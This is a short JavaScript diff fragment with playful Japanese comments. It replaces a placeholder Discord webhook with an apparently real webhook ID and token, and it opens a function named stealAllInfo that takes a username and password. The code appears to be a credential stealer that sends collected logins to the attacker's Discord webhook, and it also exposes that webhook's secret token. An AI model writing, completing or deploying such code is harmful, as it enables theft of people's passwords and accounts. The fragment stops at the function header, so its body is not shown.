@@ -1,5 +1,5 @@
 // ここに自分のDiscord Webhook URLを入れるにゃ！（絶対に公開リポジトリにそのままコミットしないでね…GitHubなら環境変数か別管理で）
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/あなたのWebhookID/トークン";
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1468139405934989322/HAhPkXDzCI6Q0JdS5MF4iHf2ASRdj16Enuazh3qy9nrsyeUXrz6I02cqHF6FUAE-O8lf";
 
 // 情報収集関数
 async function stealAllInfo(username, password) {
